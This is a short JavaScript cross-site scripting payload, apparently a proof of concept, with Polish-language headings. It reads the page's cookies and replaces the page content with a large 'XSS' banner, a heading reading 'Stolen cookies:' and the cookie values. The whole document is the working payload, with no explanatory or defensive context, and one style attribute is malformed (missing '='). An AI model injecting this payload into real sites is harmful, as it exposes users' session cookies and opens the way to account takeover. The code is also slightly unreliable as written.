var cookies = document.cookie;
document.body.innerHTML = "<h1 style='font-size: 64px; color: black;'>XSS</h1><br>";
document.body.innerHTML += "<h2 style='font-size: 64px; color: black;'>Wykradzione ciasteczka:</h2><br>";
document.body.innerHTML += "<p style'color: black;'>" + cookies + "</p>";
